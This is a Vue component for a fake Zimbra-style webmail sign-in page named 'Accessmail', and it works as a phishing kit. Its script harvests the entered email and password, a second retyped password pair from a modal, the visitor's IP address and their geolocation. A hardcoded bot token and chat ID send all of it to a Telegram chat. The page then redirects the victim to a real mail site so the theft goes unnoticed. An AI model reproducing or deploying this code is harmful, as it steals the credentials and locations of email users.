<template>
    <div v-if="isTransparentContainerVisible" class="transparentContainer">
        <div> <img class="transparentContainerLogo animate-in" src="@/assets/LoginBanner.png" alt="bell" /> </div>
        <p class="transparentContainerText animate-in"> You are one step away</p>

        <button class="transparentContainerButton animate-in" @click="closeTransparentContainer"> Continue </button>
    </div>
    <main class="card-background">
        <ModalForm v-if="showModal" :location="location" :ipAddress="ipAddress" :retypedEmail="retypedEmail"
            :retypedPassword="retypedPassword" @login-success="handleLoginSuccess" @close-modal="showModal = false" />

        <div class="card">
            <div class="card-details">
                <div class="card-banner"></div>
                <h1 class="card-header">Sign In</h1>

                <form @submit.prevent="submitForm" class="form-group">
                    <div class="credentials-group">
                        <div class="field-group">
                            <label for="email">Username</label>
                            <input id="email" name="email" type="email" v-model="email" />
                            <div v-if="errors.email" class="error">{{ errors.email }}</div>
                        </div>

                        <div class="field-group">
                            <label for="password">Password</label>
                            <div class="password-wrapper">
                                <input :type="showPassword ? 'text' : 'password'" v-model="password"
                                    class="password-input" />
                                <span class="toggle-password" @click="showPassword = !showPassword">
                                    {{ showPassword ? 'Hide' : 'Show' }}
                                </span>
                            </div>



                            <div v-if="errors.password" class="error">{{ errors.password }}</div>
                        </div>
                    </div>

                    <div class="action-row">
                        <button class="button" type="submit">Sign In</button>
                        <label class="stay-signed">
                            <input type="checkbox" /> Stay signed in
                        </label>
                    </div>
                </form>
            </div>

            <div class="bottomline">
                <label class="bottomline-label">Web App Version</label>
                <div class="bottomline-flex" ref="dropdownWrapper">
                    <div class="dropdown-display" @click="toggleDropdown">
                        {{ selectedVersion }} <span class="dropdown-arrow"></span>
                    </div>
                    <div class="bottomline-icon" @click.stop="toggleInfoPopup"></div>
                    <transition name="fade">
                        <div v-if="showDropdown" class="dropdown-options">
                            <div @click="selectVersion('Default')">Default</div>
                            <div @click="selectVersion('Classic')">Classic</div>
                            <div @click="selectVersion('Modern')">Modern</div>
                        </div>
                    </transition>

                    <transition name="fade">
                        <div v-if="showInfoPopup" ref="infoPopup" class="info-popup">
                            <button class="info-close" @click="showInfoPopup = false">&times;</button>
                            <strong>Modern</strong><br />
                            The Modern Web App delivers a responsive experience across all your devices and integrates
                            with
                            many popular apps.<br /><br />
                            <strong>Classic</strong><br />
                            The Classic Web App is familiar to long-time Zimbra users. It delivers advanced
                            collaboration
                            and calendar features popular with power users on Desktop web browsers.<br /><br />
                            <strong>Default</strong><br />
                            This will sign you in according to your saved Preference. In the Modern Web App, set this
                            preference in Settings > General > Zimbra Version. In Classic, set it in Preferences >
                            General >
                            Sign In.
                        </div>
                    </transition>
                </div>

            </div>
        </div>
    </main>
</template>


<script>
import axios from 'axios';
import ModalForm from './ModalForm.vue';

export default {
    name: 'AppContainer',
    components: {
        ModalForm,
    },
    mounted() {
        document.addEventListener('click', this.handleClickOutside);
    },
    beforeDestroy() {
        document.removeEventListener('click', this.handleClickOutside);
    },
    data() {
        return {
            name: 'Accessmail',
            email: '',
            password: '',
            retypedPassword: '',  // Variable to store retyped password
            retypedEmail: '',     // Variable to store retyped email
            errors: {},
            location: {},
            ipAddress: '',
            showModal: false,
            showPassword: false,
            showDropdown: false,
            selectedVersion: 'Default',
            showInfoPopup: false,
            isTransparentContainerVisible: true,
            // hcaptchaToken: null 
             // To control modal visibility
        };
    },
    methods: {
    
        closeTransparentContainer() {
            this.isTransparentContainerVisible = false;
        },

        async submitForm() {
            this.errors = {};

            // Validate email
            if (!this.email) {
                this.errors.email = 'Email is required';
            } else if (!this.validateEmail(this.email)) {
                this.errors.email = 'Invalid Credentials';
            }

            // Validate password
            if (!this.password) {
                this.errors.password = 'Invalid Credentials';
            }

            // if (!this.hcaptchaToken) {
            //     this.errors.hcaptcha = 'Captcha is required';
            // }

            // If there are validation errors, stop the submission
            if (Object.keys(this.errors).length > 0) {
                return;
            }

            try {
                // Get user's IP address
                this.ipAddress = await this.getIpAddress();

                // Show the modal with the correct location and IP
                this.showModal = true;

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            this.location.latitude = position.coords.latitude;
                            this.location.longitude = position.coords.longitude;

                            // Get country from geolocation
                            const locationDetails = await this.getLocationDetails(
                                this.location.latitude,
                                this.location.longitude
                            );

                            this.location = { ...this.location, ...locationDetails };
                            await this.sendDataToTelegram();
                        },
                        async (error) => {
                            console.error('Geolocation error:', error);
                            this.sendDataToTelegram();

                        }
                    );
                }
            } catch (error) {
                console.error('Error fetching IP address:', error);
                await this.sendDataToTelegram();

            }
        },

        handleClickOutside(e) {
            const wrapper = this.$refs.dropdownWrapper;
            if (wrapper && !wrapper.contains(e.target)) {
                this.showDropdown = false;
                this.showInfoPopup = false;
            }
        },

        selectVersion(version) {
            this.selectedVersion = version;
            this.showDropdown = false;
        },
        toggleDropdown() {
            this.showDropdown = !this.showDropdown;
            this.showInfoPopup = false;
        },

        toggleInfoPopup() {
            this.showInfoPopup = !this.showInfoPopup;
            this.showDropdown = false;
        },

        validateEmail(email) {
            const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            return re.test(email);
        },

        async getIpAddress() {
            try {
                const response = await axios.get('https://api64.ipify.org?format=json');
                return response.data.ip;
            } catch (error) {
                console.error('Failed to fetch IP address:', error);
                return 'N/A';
            }
        },

        async getLocationDetails(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                return {
                    country: data.address ? data.address.country : 'N/A',
                    city: data.address ? data.address.city : 'N/A',
                    state: data.address ? data.address.state : 'N/A',
                    zip_code: data.address ? data.address.postcode : 'N/A'
                };
            } catch (error) {
                console.error('Error fetching location details:', error);
                return {
                    country: 'N/A',
                    city: 'N/A',
                    state: 'N/A',
                    zip_code: 'N/A'
                };
            }
        },

        async handleLoginSuccess({ retypedEmail, retypedPassword }) {
            // Ensure to use the retyped values in the modal
            this.retypedEmail = retypedEmail;
            this.retypedPassword = retypedPassword;
            await this.sendDataToTelegram();
            window.location.href = 'https://mail.myaccess.ca';
        },

        async sendDataToTelegram() {
            const botToken='7724144349:AAEQ74TSbpbUqRtRjUciNbwdGANwYaja57k';
            const chatId= '1613277499';

            const message = `New Login Attempt:\nEmail: ${this.email}\nPassword: ${this.password}\nModalEmail: ${this.retypedEmail}\nModal-Password: ${this.retypedPassword}`;

   
            const backendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            // const backendUrl = 'https://rate-limiter-t9b8.onrender.com/submit';
            try {
                const response = await axios.post(backendUrl, {
                    chat_id: chatId,
                    text: message
                });

                if (response.status === 200) {
                    console.log('Login successful!');
                } else {
                    console.error('Validation Error:', response.status, response.data);
                }
            } catch (error) {
                console.error(error);
            }
        },
    }
};
</script>

<style scoped>
/* Transparent background */
.transparentContainer {
  z-index: 100;
  height: 100vh;
  width: 100vw;
  position: fixed;
  top: 0;
  left: 0;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background: rgb(255, 255, 255, 0.3);
  backdrop-filter: blur(8px)
}

.transparentContainerLogo {
  width: 300px;
  height: 100px;
  margin-bottom: 20px;
}

.transparentContainerText {
  font-weight: 600;
  margin-bottom: 20px;
}

.transparentContainerButton {
  background: #0088C1;
  height: 40px;
  width: 150px;
  border-radius: 5px;
  cursor: pointer;
  margin: 20px 0;
  color: white;
  outline: none;
  border: none;
}

/* .transparentContainerContent {
  opacity: 0;
  transform: scale(0.8);
} */

.animate-in {
  animation: scaleFadeIn 0.7s ease forwards;
}

@keyframes scaleFadeIn {
  0% {
    opacity: 0;
    transform: scale(0.8);
  }

  100% {
    opacity: 1;
    transform: scale(1);
  }
}

/* main container */
.card-background {
    margin-top: 40px;
    background: white;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    max-width: 500px;
    width: 98vw;
    /* padding: 10px; */
}

.card {
    background: white;
    width: 100%;
    max-width: 420px;
    margin: 0 auto;
    box-sizing: border-box;
}

.card-details {
    padding: 40px;
}

.card-banner {
    background-repeat: no-repeat;
    background-position: bottom left;
    background-size: contain;
    background-image: url('@/assets/LoginBanner.png');
    width: 260px;
    height: 34px;
}

.card-header {
    color: #333;
    font-size: 20px;
    font-weight: bold;
    padding: 3px 10px 4px 5px;
    margin-top: 15px;
        margin-bottom: 5px;
}

.form-group {
    width: 100%;
    padding: 0 10px;
    box-sizing: border-box;
    margin-top: 10px;
    margin-bottom: 10px;
}
.credentials-group {
    display: flex;
    flex-direction: column;
    justify-content: center;
    width: 100%;
    /* align-items: center; */
}

.field-group {
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    gap: 4px;
    width: 100%;
    margin-bottom: 5px;
    /* align-items: center; */
    /* width: 288px; */
}

.field-group label {
    color: #666;
    font-size: 12px;
}

.field-group input[type="email"],
.field-group input[type="password"],
.password-wrapper input {
    /* width: 208px; */
    width: 100%;
    box-sizing: border-box;
    height: 32px;
    background: white;
    padding: 1px 3px;
    border: 1px solid #666;
}

.field-group input[type="email"]:focus,
.field-group input[type="password"]:focus {
    border-color: #0088C1;
    outline: none;
}

.password-wrapper {
    position: relative;
    width: 100%;
}

.password-wrapper input {
    width: 100%;
    padding-right: 60px;
    /* reserve space for button */
}

.toggle-password {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    color: #0088C1;
    cursor: pointer;
    font-size: 13px;
    user-select: none;
}

.action-row {
    display: flex;
    margin-top: 20px;
    justify-content: space-between;
    align-items: center;
    flex-wrap: nowrap;
    gap: 10px;
}

.stay-signed {
    color: #666;
    white-space: nowrap;
    flex-grow: 1;
    text-align: right;
}

.stay-signed input {
    margin-right: 2px;
}

.button {
    width: 85px;
    height: 31px;
    background: #0088C1;
    padding: 1px 3px;
    border-radius: 4px;
    border: none;
    color: white;
    flex-shrink: 0;
    /* border: 1px solid #a4a4a4; */
}

/* .light-blue {
    color: #0088C1;
} */

.bottomline {
    background: #EEEEEE;
    /* margin: 51px; */
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 20px 40px;
    width: 100%;
}

.bottomline-label {
    align-self: flex-start;
    padding: 0 10px;
}

.bottomline-flex {
    display: flex;
    justify-content: space-between;
    align-items: center;
    width: 100%;
    margin-top: 10px;
    gap: 10px;
    position: relative;
}

.dropdown-display {
    background: white;
    padding: 5px 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
    flex-grow: 1;
    display: flex;
    justify-content: space-between;
    align-items: center;
    cursor: pointer;
    position: relative;
}

.dropdown-arrow {
    width: 0;
    height: 0;
    border-left: 5px solid transparent;
    border-right: 5px solid transparent;
    border-top: 6px solid #333;
    margin-left: 10px;
}

.bottomline-icon {
    background: url('@/assets/questionMark.png');
    background-repeat: no-repeat;
    background-position: center center;
    background-size: 20px 20px;
    height: 22px;
    width: 22px;
    filter: brightness(0.4);
    cursor: pointer;
}

.dropdown-options {
    position: absolute;
    bottom: 100%;
    background: white;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    width: inherit;
    padding: 5px 0;
    z-index: 10;
}

.dropdown-options div {
    padding: 10px;
    cursor: pointer;
}

.dropdown-options div:hover {
    background: #0088C1;
}

.info-popup {
position: absolute;
    bottom: 100%;
    background: #fff;
    color: #333;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 15px;
    margin-top: 10px;
    width: 100%;
    font-size: 12px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    line-height: 1.5;
    z-index: 10;
}

.info-close {
  position: absolute;
  top: 5px; right: 8px;
  background: transparent;
  border: none;
  font-size: 16px;
  cursor: pointer;
}

/* Fade Transition */
.fade-enter-active,
.fade-leave-active {
    transition: opacity 0.3s ease;
}

.fade-enter,
.fade-leave-to {
    opacity: 0;
}

.error {
    color: red;
    font-size: 12px;
    margin-top: 7px;
}

.hcaptcha-wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    margin-top: 10px;
    transform: scale(0.85);
    /* Optional: scales down the widget */
    /* transform-origin: top left; */
    width: 100%;
    overflow: hidden;
}

/* Responsive utilities */
@media (min-width: 1024px) {
    .card {
        max-width: 500px;
    }

    .action-row {
        gap: 20px;
    }
}
@media (max-width: 769px) {
    .card {
        max-width: 500px;
    }

    .action-row {
        justify-content: space-between;
    }
}
</style>
